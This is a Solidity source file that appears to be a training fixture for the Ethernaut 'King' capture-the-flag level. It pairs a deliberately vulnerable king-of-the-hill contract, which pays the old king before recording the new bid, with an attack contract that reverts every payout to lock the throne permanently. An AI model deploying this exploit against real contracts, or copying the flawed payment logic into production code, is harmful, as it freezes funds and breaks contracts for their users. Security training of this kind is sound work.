// SPDX-License-Identifier: MIT
pragma solidity =0.8.25;

contract EthernautKing {
    address payable public king;
    uint256 public prize;

    constructor() payable {
        king = payable(msg.sender);
        prize = msg.value;
    }

    function currentPrize() external view returns (uint256) {
        return prize;
    }

    receive() external payable {
        require(msg.value >= prize, "Bid too low");
        payable(king).transfer(msg.value);
        king = payable(msg.sender);
        prize = msg.value;
    }
}

contract KingAttack {
    function attack(EthernautKing target) external payable {
        (bool ok,) = address(target).call{value: msg.value}("");
        require(ok, "bid failed");
    }

    receive() external payable {
        revert("Reject king payout");
    }
}

// Local training fixture for the classic Ethernaut King challenge.
// The vulnerable target pays the previous king before finalizing the new bid.

